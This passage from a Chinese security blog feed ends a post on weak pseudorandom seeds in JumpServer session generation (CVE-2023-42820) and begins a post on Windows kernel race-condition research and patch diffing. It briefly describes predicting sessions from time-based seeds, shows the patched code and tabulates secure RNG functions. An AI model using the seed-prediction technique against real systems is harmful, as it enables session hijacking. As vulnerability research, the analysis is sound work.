\u5c06\u65f6\u95f4-delay\u4f5c\u4e3a\u521d\u59cb\u79cd\u5b50 \u2192 \u4f7f\u7528\u521d\u59cb\u79cd\u5b50\u8ba1\u7b97session \u2192 \u9a8c\u8bc1\u5f53\u524dsession\u662f\u5426\u6b63\u786e \u2192 \u79cd\u5b50+1\uff08\u76f4\u81f3\u6b63\u786e\uff09\\n\\n### \u4fee\u590d\\n\\n\u67e5\u770b\u4fee\u590d\u540e\u7684\u7248\u672c\u4ee3\u7801\\n\\n```java\\nprotected synchronized String generateSessionId() {\\n    String result;\\n    do {\\n        result = AuthUtil.generateRandomBase64String(32);\\n    } while(this.sessions.get(result) != null);\\n\\n    return result;\\n}\\n```\\n\\n\u65b0\u7248\u672c\u76f4\u63a5\u5220\u6389\u4e86initRandom\u51fd\u6570\uff0c\u5e76\u4fee\u6539\u4e86\u751f\u6210session\u7684\u903b\u8f91\uff0c\u8ddf\u8fdb\\n\\n```java\\npublic static String generateRandomBase64String(int entropyCountInBytes) {\\n\\t  assert entropyCountInBytes > 0;\\n\\t\\n\\t  byte[] bytes = new byte[entropyCountInBytes];\\n\\t  SecureRandomProvider.get().nextBytes(bytes);\\n\\t  return BASE64_ENCODER.encodeToString(bytes);\\n}\\n```\\n\\n\u7ee7\u7eed\u8ddf\u8fdb\\n\\n```java\\npublic void nextBytes(byte[] bytes) {\\n\\t  LOG.tracef(\\"nextBytes(bytes.length=%s)...\\", new Object[]{bytes.length});\\n\\t  this.secureRandom.nextBytes(bytes);\\n\\t  LOG.trace(\\"Done.\\");\\n}\\n```\\n\\n\u770b\u5230\u4f7f\u7528\u7684\u51fd\u6570\u4ecd\u7136\u662f\u4f2a\u968f\u673a\u51fd\u6570\uff0c\u67e5\u770bseed\u662f\u5426\u53ef\u4ee5\u63a8\u6d4b\\n\\n```java\\nprivate SecureRandomProvider() throws NoSuchAlgorithmException {\\n    LOG.debug(\\"Creating SecureRandom object...\\");\\n    this.secureRandom = SecureRandom.getInstance(\\"SHA1PRNG\\");\\n    byte[] seed = new byte[128];\\n    (new Random()).nextBytes(seed);\\n    this.secureRandom.setSeed(seed);\\n    this.secureRandom.nextBytes(new byte[128]);\\n    (new Thread(new SeedGenerator(), \\"secure-random-seed-gen\\")).start();\\n    LOG.debug(\\"... SecureRandom Created.\\");\\n}\\n```\\n\\n\u8fd9\u91ccseed\u751f\u6210\u867d\u7136\u4f7f\u7528\u4e86\u4f2a\u968f\u673a\u51fd\u6570random().nextbytes()\uff0c\uff08random\u51fd\u6570\u9ed8\u8ba4\u4f7f\u7528timestamp\u4f5c\u4e3a\u79cd\u5b50\uff09\u4f46\u662f\u7531\u4e8e\u6bcf\u6b21\u751f\u6210session\u65f6\u90fd\u9700\u8981\u8c03\u7528\u4e00\u904d\u8fd9\u4e2a\u6d41\u7a0b\uff0c\u4f7f\u7528\u7684seed\u4e3a\u5f53\u524d\u65f6\u95f4\uff0c\u6240\u4ee5\u6bcf\u6b21\u751f\u6210session\u65f6\u7684seed\u6ca1\u6cd5\u901a\u8fc7\u4e4b\u524d\u7684\u65b9\u6cd5\u8fdb\u884c\u63a8\u6d4b\uff0c\u4ece\u800c\u4f7f\u5f97session\u7684\u503c\u4e0d\u53ef\u8ba1\u7b97\uff0c\u6700\u7ec8\u9632\u6b62\u4e86session\u88ab\u52ab\u6301\u7684\u98ce\u9669\\n\\n\u8fd9\u91cc\u8fd8\u6709\u53e6\u4e00\u79cd\u4fee\u590d\u65b9\u6cd5\uff0c\u5373\u4f7f\u7528java.security.SecureRandom\u9ed8\u8ba4\u79cd\u5b50\u5373\u53ef\uff0c\u4e0d\u8fdb\u884csetseed\\n\\n## 0x04 \u6f0f\u6d1e\u6a21\u5f0f\u603b\u7ed3\\n\\n\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u968f\u673a\u51fd\u6570 \u2192 \u79cd\u5b50\u53ef\u77e5/\u53ef\u9884\u6d4b \u2192 \u968f\u673a\u6570\u53ef\u8ba1\u7b97 \u2192 \u9020\u6210\u66f4\u4e25\u91cd\u7684\u5b89\u5168\u95ee\u9898\\n\\n\u4e0a\u9762\u7684\u4e24\u4e2a\u6848\u4f8b\u7684\u4fee\u590d\u65b9\u6cd5\u5747\u662f\u5bf9\u79cd\u5b50\u8fdb\u884c\u5904\u7406\uff0c\u9632\u6b62\u79cd\u5b50\u53ef\u4ee5\u88ab\u9884\u6d4b\uff0c\u4ece\u800c\u4fee\u590d\u539f\u6709\u7684\u5b89\u5168\u95ee\u9898\\n\\n\u540c\u6837\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5c06**\u4f2a\u968f\u673a\u51fd\u6570**\u4fee\u6539\u4e3a**\u5b89\u5168\u968f\u673a\u51fd\u6570**\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u4e0a\u8ff0\u5b89\u5168\u95ee\u9898\uff08\u4f46\u5b89\u5168\u968f\u673a\u51fd\u6570\u53ef\u80fd\u5e76\u6ca1\u6709\u4f2a\u968f\u673a\u51fd\u6570\u6548\u7387\u9ad8\uff09\\n\\n| \u8bed\u8a00 | \u5e38\u89c1\u4f2a\u968f\u673a\u51fd\u6570 | \u5b89\u5168\u968f\u673a\u51fd\u6570 |\\n|----|----|----|\\n| C | srand | linux \u4f7f\u7528/dev/urandom |\\n|    | rand | Windows\u4f7f\u7528CryptGenRandom\u5e76\u4f7f\u7528\u9ed8\u8ba4\u79cd\u5b50 |\\n| C++ | mt19937 | C++\u4f7f\u7528std::random_device \u7c7b\u6765\u83b7\u53d6\u5b89\u5168\u7684\u968f\u673a\u79cd\u5b50 |\\n|    | default_random_engine |    |\\n| python | random | secrets |\\n| java | java.security.SecureRandom  //\u5f3a\u4f2a\u968f\u673a\u51fd\u6570 | SecureRandom.getInstanceStrong |\\n|    | java.util.Random   //\u5f31\u4f2a\u968f\u673a\u6570 |    |\\n| php | mt_scrand   mt_rand | random_bytes |\\n| C# | Random | System.Security.Cryptography.RNGCryptoServiceProvider |\\n| golang | math/rand | crypto/rand |\\n\\n\u5982\u679c\u79cd\u5b50\u4e0d\u53ef\u9884\u6d4b\uff0c\u90a3\u4e48\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u5c31\u96be\u4ee5\u9884\u6d4b\uff0c\u79f0\u4e3a\u5f3a\u4f2a\u968f\u673a\u6570\\n\\n\u5982\u679c\u79cd\u5b50\u53ef\u9884\u6d4b\uff0c\u90a3\u4e48\u968f\u673a\u6570\u5e8f\u5217\u5c31\u901a\u5e38\u53ef\u4ee5\u9884\u6d4b\uff0c\u79f0\u4e3a\u5f31\u968f\u673a\u6570\\n\\n## 0x05 Reference\\n\\n<https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw>\\n\\n<https://github.com/vulhub/vulhub/blob/master/jumpserver/CVE-2023-42820/README.zh-cn.md>\\n\\n<https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html>\\n\\n<https://github.com/sourceincite/randy>\\n\\n<https://stackoverflow.com/questions/53496652/seed-to-java-security-securerandom-on-windows-os>\\n\\n<https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenrandom>"},{"id":"research-on-windows-kernel-race-condition-vulnerabilities","metadata":{"permalink":"/blog/research-on-windows-kernel-race-condition-vulnerabilities","editUrl":"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-11-01-research-on-windows-kernel-race-condition-vulnerabilities/index.md","source":"@site/blog/2023-11-01-research-on-windows-kernel-race-condition-vulnerabilities/index.md","title":"Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7814\u7a76","description":"\u4e00\u3001\u7814\u7a76\u80cc\u666f","date":"2023-11-01T00:00:00.000Z","formattedDate":"2023\u5e7411\u67081\u65e5","tags":[{"label":"Microsoft","permalink":"/blog/tags/microsoft"},{"label":"Windows","permalink":"/blog/tags/windows"},{"label":"Race Condition","permalink":"/blog/tags/race-condition"}],"readingTime":29.195,"hasTruncateMarker":true,"authors":[{"name":"\u7c73\u7c73","key":"zhangshuqiao"}],"frontMatter":{"slug":"research-on-windows-kernel-race-condition-vulnerabilities","title":"Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7814\u7a76","authors":"zhangshuqiao","tags":["Microsoft","Windows","Race Condition"]},"prevItem":{"title":"\u4f2a\u968f\u673a\u6570\u95ee\u9898\u6d45\u6790","permalink":"/blog/analysis-of-pseudorandom-number-problems"},"nextItem":{"title":"Microsoft Hyper-V \u865a\u62df TPM \u8bbe\u5907\u6f0f\u6d1e\u5206\u6790","permalink":"/blog/microsoft-hyper-vtpm"}},"content":"## \u4e00\u3001\u7814\u7a76\u80cc\u666f\\n\\n### \uff08\u4e00\uff09\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u6f0f\u6d1e\\n\\n\u64cd\u4f5c\u7cfb\u7edf\u662f\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6838\u5fc3\u8f6f\u4ef6\uff0c\u5176\u4e3b\u8981\u529f\u80fd\u5728\u4e8e\u7ba1\u7406\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u7684\u5404\u79cd\u8f6f\u786c\u4ef6\u8d44\u6e90\uff0c\u5e76\u4e3a\u8ba1\u7b97\u673a\u7528\u6237\u548c\u7528\u6237\u7a0b\u5e8f\u63d0\u4f9b\u8bbf\u95ee\u8fd9\u4e9b\u8d44\u6e90\u7684\u7edf\u4e00\u62bd\u8c61\u3002\u4e3a\u8fbe\u5230\u8fd9\u4e00\u8bbe\u8ba1\u76ee\u6807\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u901a\u5e38\u8fd0\u884c\u5728\u79f0\u4e3a\u5185\u6838\u6001\u7684\u9ad8\u7279\u6743\u7ea7\u6267\u884c\u73af\u5883\u4e2d\u3002\u4e00\u65e6\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u88ab\u6076\u610f\u653b\u51fb\u8005\u975e\u6cd5\u4fb5\u5165\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u7acb\u5373\u62e5\u6709\u5bf9\u6574\u4e2a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u63a7\u5236\u6743\uff0c\u9020\u6210\u6781\u5927\u5371\u5bb3\u3002\u56e0\u6b64\uff0c\u9488\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u6f0f\u6d1e\u6316\u6398\u4e00\u76f4\u662f\u5b66\u672f\u754c\u548c\u5de5\u4e1a\u754c\u7684\u7814\u7a76\u91cd\u70b9\u3002\\n\\n\x3c!-- truncate --\x3e\\n\\nWindows\u64cd\u4f5c\u7cfb\u7edf\u662f\u684c\u9762\u8ba1\u7b97\u673a\u9886\u57df\u6700\u5e7f\u6cdb\u5e94\u7528\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u4e00\uff0c\u5728\u7f51\u7edc\u7a7a\u95f4\u4e2d\u626e\u6f14\u7740\u81f3\u5173\u91cd\u8981\u7684\u89d2\u8272\u3002\u4e0e\u4e4b\u5bf9\u5e94\u7684\uff0cWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u4e5f\u5f80\u5f80\u5177\u6709\u5e7f\u6cdb\u7684\u5f71\u54cd\u548c\u4e25\u91cd\u7684\u6f5c\u5728\u5371\u5bb3\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u6765\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u7f51\u7edc\u653b\u51fb\uff0c\u7ed9\u7f51\u7edc\u5b89\u5168\u5e26\u6765\u4e25\u91cd\u7684\u5a01\u80c1\u3002\u4f8b\u5982\uff0c\u57282017\u5e74\u6d41\u884c\u7684WannaCry\u52d2\u7d22\u75c5\u6bd2\u653b\u51fb\uff0c\u5c31\u662f\u5229\u7528\u4e86MS17-010\u201c\u6c38\u6052\u4e4b\u84dd\u201d\u6f0f\u6d1e\uff0c\u5176\u53d7\u5bb3\u8005\u904d\u5e03\u5168\u7403\u591a\u56fd\uff0c\u9020\u6210\u4e86\u5de8\u5927\u7684\u635f\u5931\u3002\\n\\n\u5728Linux\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u4ee5Syzkaller\u4e3a\u4ee3\u8868\u7684\u6a21\u7cca\u6d4b\u8bd5\u5de5\u5177\u53ef\u4ee57x24\u5c0f\u65f6\u4e0d\u95f4\u65ad\u5730\u5bf9\u5185\u6838\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\uff0c\u5e76\u81ea\u52a8\u5316\u5730\u751f\u6210\u6f0f\u6d1e\u62a5\u544a\u4f9b\u7ef4\u62a4\u8005\u67e5\u9605\u3002\u7136\u800c\uff0c\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u8fd8\u6ca1\u6709\u51fa\u73b0\u5f71\u54cd\u529b\u548c\u6d4b\u8bd5\u6548\u679c\u80fd\u591f\u6bd4\u62dfSyzkaller\u7684\u5f00\u6e90\u5de5\u5177\u3002\u9020\u6210\u8fd9\u4e00\u5dee\u5f02\u7684\u539f\u56e0\u662f\u591a\u65b9\u9762\u7684\uff0c\u4f8b\u5982\uff0c\u7814\u7a76\u4eba\u5458\u53ef\u4ee5\u901a\u8fc7\u5bf9Linux\u6e90\u7801\u8fdb\u884c\u9759\u6001\u5206\u6790\u5f97\u5230\u4f9bSyzkaller\u4f7f\u7528\u7684Syzlang\u6a21\u7248\uff0c\u5176\u4e2d\u5305\u542b\u5bf9\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u7684\u5b8c\u6574\u63cf\u8ff0\uff0c\u7531\u6b64\u53ef\u4ee5\u9a71\u52a8\u6a21\u7cca\u6d4b\u8bd5\u3002\u4f46\u5728Windows\u4e0a\uff0c\u7531\u4e8e\u5185\u6838\u662f\u95ed\u6e90\u7684\uff0c\u5bf9\u5176\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u7684\u5206\u6790\u8fc7\u7a0b\u66f4\u4e3a\u590d\u6742\u548c\u56f0\u96be\u3002\\n\\n\u901a\u8fc7\u5206\u6790\u8fd1\u5e74\u6765\u62ab\u9732\u7684Windows\u5185\u6838\u6001\u6f0f\u6d1e\uff0c\u6211\u4eec\u53d1\u73b0\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u5927\u591a\u662f\u7531\u72ec\u7acb\u7684\u7814\u7a76\u4eba\u5458\u6216\u5b89\u5168\u7814\u7a76\u56e2\u961f\u53d1\u73b0\uff0c\u5e76\u4e14\u6781\u5927\u5730\u4f9d\u8d56\u4e8e\u4e13\u5bb6\u77e5\u8bc6\uff0c\u53ea\u5728\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u4e86\u6a21\u7cca\u6d4b\u8bd5\u7b49\u81ea\u52a8\u5316\u65b9\u6cd5\u6765\u8f85\u52a9\u6f0f\u6d1e\u6316\u6398\u3002\u5947\u5b89\u4fe1\u5929\u5de5\u5b9e\u9a8c\u5ba4\u8fd1\u5e74\u6765\u5728Hyper-V\u4e2d\u53d1\u73b0\u7684\u6f0f\u6d1e\uff0c\u4e5f\u540c\u6837\u79bb\u4e0d\u5f00\u5b89\u5168\u7814\u7a76\u5458\u5bf9Hyper-V\u6574\u4f53\u67b6\u6784\u548c\u6f0f\u6d1e\u6a21\u5f0f\u7684\u6df1\u5165\u7406\u89e3\u3002\\n\\n\u6709\u9274\u4e8e\u6b64\uff0c\u7b14\u8005\u4e5f\u9488\u5bf9\u8fd1\u5e74\u6765\u62ab\u9732\u7684Windows\u5185\u6838\u6001\u6f0f\u6d1e\u8fdb\u884c\u4e86\u4eba\u5de5\u7684\u5206\u6790\u548c\u7814\u7a76\uff0c\u5e76\u4e3b\u8981\u805a\u7126\u4e8e\u7ade\u6001\u6761\u4ef6\u8fd9\u4e00\u6f0f\u6d1e\u7c7b\u578b\u3002\u672c\u6587\u4fbf\u662f\u5bf9\u76f8\u5173\u7814\u7a76\u53d1\u73b0\u7684\u603b\u7ed3\u3002\\n\\n### \uff08\u4e8c\uff09\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\\n\\n\u7ade\u6001\u6761\u4ef6\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u7684\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5b83\u6307\u7684\u662f\u5728\u591a\u7ebf\u7a0b\u6216\u591a\u8fdb\u7a0b\u73af\u5883\u4e2d\uff0c\u7531\u4e8e\u4e0d\u6070\u5f53\u7684\u540c\u6b65\u64cd\u4f5c\u6216\u7ade\u4e89\u8d44\u6e90\u7684\u8bbf\u95ee\u800c\u5bfc\u81f4\u7684\u4e0d\u786e\u5b9a\u6027\u884c\u4e3a\u3002\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u591a\u7ebf\u7a0b\u7684\u7a0b\u5e8f\u8c03\u5ea6\u662f\u81f3\u5173\u91cd\u8981\u7684\u4e00\u9879\u4efb\u52a1\uff0c\u5b83\u76f4\u63a5\u5f71\u54cd\u4e86\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6027\u80fd\u548c\u8d44\u6e90\u5229\u7528\u6548\u7387\u3002\u591a\u7ebf\u7a0b\u7f16\u7a0b\u5141\u8bb8\u7a0b\u5e8f\u540c\u65f6\u6267\u884c\u591a\u4e2a\u4efb\u52a1\uff0c\u4ece\u800c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u7684\u54cd\u5e94\u901f\u5ea6\u548c\u5e76\u53d1\u5904\u7406\u80fd\u529b\u3002\u7136\u800c\uff0c\u4e3a\u4e86\u6709\u6548\u5730\u7ba1\u7406\u8fd9\u4e9b\u7ebf\u7a0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5fc5\u987b\u5177\u5907\u9ad8\u6548\u7684\u8c03\u5ea6\u673a\u5236\uff0c\u51b3\u5b9a\u54ea\u4e2a\u7ebf\u7a0b\u83b7\u5f97CPU\u65f6\u95f4\u7247\uff0c\u4ee5\u786e\u4fdd\u5404\u4e2a\u7ebf\u7a0b\u80fd\u591f\u5408\u7406\u5730\u5206\u4eab\u8ba1\u7b97\u8d44\u6e90\u3002\u8fd9\u4e00\u8c03\u5ea6\u51b3\u7b56\u662f\u57fa\u4e8e\u4e00\u7cfb\u5217\u7b97\u6cd5\u548c\u7b56\u7565\u8fdb\u884c\u7684\uff0c\u6d89\u53ca\u5230\u7ebf\u7a0b\u7684\u4f18\u5148\u7ea7\u3001\u72b6\u6001\u7ba1\u7406\u3001\u62a2\u5360\u673a\u5236\u4ee5\u53ca\u8d44\u6e90\u4e89\u7528\u89e3\u51b3\u7b49\u591a\u4e2a\u65b9\u9762\u3002\\n\\n\u8fd9\u4e00\u8c03\u5ea6\u673a\u5236\u4e5f\u5bfc\u81f4\u591a\u4e2a\u7ebf\u7a0b\u6216\u8fdb\u7a0b\u5728\u4e89\u593a\u8d44\u6e90\u7684\u540c\u65f6\uff0c\u6267\u884c\u987a\u5e8f\u5e76\u4e0d\u786e\u5b9a\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u4ea7\u751f\u610f\u60f3\u4e0d\u5230\u7684\u7ed3\u679c\u3002\u4e3a\u4e86\u907f\u514d\u95ee\u9898\uff0c\u591a\u7ebf\u7a0b\u573a\u666f\u4e0b\u5bf9\u5173\u952e\u8d44\u6e90\u7684\u8bbf\u95ee\u9700\u8981\u5229\u7528\u52a0\u9501\u3001\u540c\u6b65\u7b49\u673a\u5236\u6765\u4fdd\u8bc1\u5b89\u5168\u3002\u5018\u82e5\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bbf\u95ee\u5171\u4eab\u53d8\u91cf\u6216\u8d44\u6e90\uff0c\u800c\u6ca1\u6709\u9002\u5f53\u7684\u540c\u6b65\u673a\u5236\u6765\u4fdd\u62a4\u8fd9\u4e9b\u8d44\u6e90\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u635f\u574f\u3001\u7a0b\u5e8f\u5d29\u6e83\u6216\u4e0d\u4e00\u81f4\u7684\u7ed3\u679c\uff0c\u4ece\u800c\u5e26\u6765\u4e25\u91cd\u7684\u5b89\u5168\u548c\u53ef\u9760\u6027\u95ee\u9898\u3002\\n\\n ![](./8f35fffb-2a4c-4308-b51c-272595afbdcb.png)\\n\\n*\u56fe1\uff1a\u5178\u578b\u7684\u7ade\u6001\u6761\u4ef6\u6210\u56e0\uff0c\u4e24\u4e2a\u7ebf\u7a0b\u65e0\u4fdd\u62a4\u5730\u8bbf\u95ee\u540c\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61*\\n\\n\u5982\u56fe1\u6240\u793a\uff0c\u6f0f\u6d1eCVE-2022-29142\u7684\u539f\u56e0\u6b63\u662f\u4e24\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u540c\u65f6\u8bbf\u95ee\u540c\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61\uff0c\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u7ebf\u7a0b\u8bd5\u56fe\u5173\u95ed\u8be5\u5bf9\u8c61\u7684\u53e5\u67c4\uff0c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u4fbf\u53ef\u80fd\u8bbf\u95ee\u5df2\u88ab\u91ca\u653e\u7684\u6307\u9488\u3002\\n\\n\u672c\u6587\u5c06\u4f1a\u5177\u4f53\u4ecb\u7ecd\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u5e26\u6765\u7684\u6f5c\u5728\u98ce\u9669\uff0c\u5e76\u63cf\u8ff0\u590d\u73b0\u771f\u5b9e\u5b58\u5728\u4e8eWindows\u5185\u6838\u4e2d\u7684\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u65f6\u7684\u53d1\u73b0\u3002\\n\\n## \u4e8c\u3001\u6f0f\u6d1e\u5206\u6790\u91c7\u7528\u7684\u5173\u952e\u6280\u672f\\n\\n\u5728\u8fdb\u884c\u9488\u5bf9Windows\u5185\u6838\u7684\u6f0f\u6d1e\u5206\u6790\u548c\u7814\u7a76\u65f6\uff0c\u4e3b\u8981\u91c7\u7528\u7684\u5173\u952e\u6280\u672f\u5305\u62ec\uff1a\u8865\u4e01\u5bf9\u6bd4\u5206\u6790\u3001\u4e8c\u8fdb\u5236\u9006\u5411\u5206\u6790\u3001\u7ade\u6001\u6761\u4ef6\u6784\u5efa\u548c\u8c03\u8bd5\u7b49\u3002\\n\\n### \uff08\u4e00\uff09\u8865\u4e01\u5bf9\u6bd4\u53ca\u4e8c\u8fdb\u5236\u9006\u5411\u5206\u6790\\n\\n\u901a\u8fc7\u5728CVE\u6570\u636e\u5e93\u4e2d\u7684\u68c0\u7d22\uff0c\u53d1\u73b0\u8fd1\u5e74\u6765\u62ab\u9732\u7684Windows\u5185\u6838\u6f0f\u6d1e\u4e2d\u4e0d\u4e4f\u7528\u6237\u63d0\u6743\u548c\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7b49\u9ad8\u5371\u6f0f\u6d1e\u3002\u7136\u800c\uff0c\u7531\u4e8e\u5fae\u8f6f\u79ef\u6781\u63a7\u5236\u6f0f\u6d1e\u7684\u5f71\u54cd\uff0c\u76f8\u5173\u6f0f\u6d1e\u7684\u516c\u5f00PoC\u7a0b\u5e8f\u6570\u91cf\u76f8\u5bf9\u8f83\u5c11\u3002\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u516c\u5f00PoC\u7684\u6f0f\u6d1e\uff0c\u5f80\u5f80\u53ea\u80fd\u83b7\u5f97\u6f0f\u6d1e\u53d1\u73b0\u8005\u901a\u8fc7\u535a\u5ba2\u6216\u793e\u4ea4\u5a92\u4f53\u900f\u9732\u7684\u5c11\u91cf\u4fe1\u606f\uff0c\u96be\u4ee5\u7531\u6b64\u5f00\u5c55\u7cfb\u7edf\u6027\u7684\u6f0f\u6d1e\u7814\u7a76\u3002\u8003\u8651\u5230\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u4fee\u590d\u8865\u4e01\u5b58\u5728\u4e8eWindows\u5b89\u5168\u66f4\u65b0\u4e2d\uff0c\u901a\u8fc7\u5bf9\u8865\u4e01\u8fdb\u884c\u5206\u6790\uff0c\u5305\u62ec\u8fdb\u884c\u8865\u4e01\u7684\u89e3\u5305\u548c\u4e8c\u8fdb\u5236\u5bf9\u6bd4\u7b49\uff0c\u80fd\u591f\u6709\u6548\u5730\u4ece\u4e2d\u63d0\u53d6\u51fa\u66f4\u65b0\u5185\u5bb9\uff0c\u8bc6\u522b\u53d7\u5f71\u54cd\u7684\u6a21\u5757\uff0c\u5e76\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5730\u4ece\u4e2d\u63d0\u53d6\u5173\u952e\u7684\u8865\u4e01\u70b9\uff0c\u7531\u6b64\u5206\u6790\u8865\u4e01\u6240\u4fee\u590d\u7684\u6f0f\u6d1e\u3002\\n\\n\u4e3a\u4e86\u80fd\u591f\u89e3\u6790\u5fae\u8f6f\u7684Windows\u5b89\u5168\u8865\u4e01\uff0c\u9996\u5148\u9700\u8981\u4e86\u89e3\u8865\u4e01\u7684\u683c\u5f0f\u4ee5\u53ca\u83b7\u53d6\u65b9\u6cd5\u3002\u6253\u5305\u8865\u4e01\u7684\u6587\u4ef6\u683c\u5f0f\u5305\u62ec\uff1a.MSU\uff08Microsoft Standalone Update\uff09\u548c.CAB\uff08Cabinet\uff09\u683c\u5f0f\u3002\u8865\u4e01\u4e00\u822c\u4f1a\u4f5c\u4e3a Windows \u66f4\u65b0\u7684\u4e00\u90e8\u5206\u81ea\u52a8\u5206\u53d1\u5230\u7528\u6237\u8bbe\u5907\u4e0a\uff0c\u4f46\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece\u5fae\u8f6f\u7684\u66f4\u65b0\u76ee\u5f55\u4e2d\u4e0b\u8f7d\u72ec\u7acb\u7684\u8865\u4e01\u3002\u6b64\u524d\uff0c\u5fae\u8f6f\u4e3b\u8981\u63d0\u4f9b\u987a\u5e8f\u7684\u66f4\u65b0\u5305\uff0c\u5b83\u4eec\u5fc5\u987b\u4f9d\u6b21\u5b89\u88c5\u5230\u7528\u6237\u7684\u7cfb\u7edf\u4e2d\u3002\u5982\u4eca\uff0c\u66f4\u65b0\u4ee5\u7d2f\u79ef\u7684\u65b9\u5f0f\u63d0\u4f9b\uff0c\u8fd9\u610f\u5473\u7740\u57fa\u672c\u7cfb\u7edf\u7248\u672c\u4e2d\u7684\u6240\u6709\u5fc5\u9700\u66f4\u65b0\u90fd\u5305\u542b\u5728\u8865\u4e01\u5305\u4e2d\uff0c\u8fd9\u4e5f\u5141\u8bb8\u7528\u6237\u5e73\u6ed1\u5730\u5347\u7ea7\u7cfb\u7edf\u7248\u672c\u3002\u6b64\u5916\uff0c\u51fa\u4e8e\u8282\u7701\u5e26\u5bbd\u7b49\u8003\u8651\uff0c\u8bb8\u591a\u66f4\u65b0\u4ee5\u589e\u91cf\u7684\u65b9\u5f0f\u5206\u53d1\uff0c\u5373\uff1a\u66f4\u65b0\u5305\u4e2d\u53ea\u5305\u542b\u5bf9\u7279\u5b9a\u4e8c\u8fdb\u5236\u76ee\u6807\u7684\u4fee\u8865\u65b9\u5f0f\uff0c\u800c\u4e0d\u5305\u542b\u5168\u90e8\u7684\u6587\u4ef6\u3002\u8fd9\u4e5f\u8fdb\u4e00\u6b65\u589e\u52a0\u4e86\u8865\u4e01\u5206\u6790\u7684\u96be\u5ea6\u3002\\n\\n\u5bf9\u4e8e\u6bcf\u6b21\u5b89\u5168\u66f4\u65b0\uff0c\u5177\u4f53\u7684\u8865\u4e01\u6587\u4ef6\u53ef\u4ee5\u4eceMicrosoft Update Catalog\u4e0a\u83b7\u53d6\u3002.MSU\u683c\u5f0f\u7684\u8865\u4e01\u5728\u4f7f\u7528expand.exe\u7a0b\u5e8f\u89e3\u5305\u540e\uff0c\u5c06\u80fd\u591f\u83b7\u5f97.CAB\u683c\u5f0f\u7684\u8865\u4e01\u6587\u4ef6\uff0c\u4e14\u8fd9\u4e9b\u6587\u4ef6\u6309\u7167\u6307\u4ee4\u96c6\u548c\u4e8c\u8fdb\u5236\u5dee\u5f02\u7c7b\u578b\u8fdb\u884c\u547d\u540d\u3002\u5bf9\u4e8e\u8865\u4e01\u5185\u5bb9\u7684\u8fdb\u4e00\u6b65\u63d0\u53d6\uff0c\u5c06\u4f9d\u8d56\u4e8e\u5fae\u8f6f\u63d0\u4f9b\u7684msdelta.dll\u5e93\u3002\u8be5\u5e93\u4e2d\u63d0\u4f9b\u4e86ApplyDelta\u7cfb\u5217\u51fd\u6570\u7528\u4e8e\u6267\u884cWindows\u7cfb\u7edf\u66f4\u65b0\u3002\u901a\u8fc7C\u6216Python\u8bed\u8a00\u8c03\u7528\u76f8\u5173\u5e93\u51fd\u6570\uff0c\u5373\u53ef\u5b9e\u73b0\u6253\u8865\u4e01\u7684\u8fc7\u7a0b\uff0c\u83b7\u5f97\u8865\u4e01\u4e4b\u540e\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\\n\\n 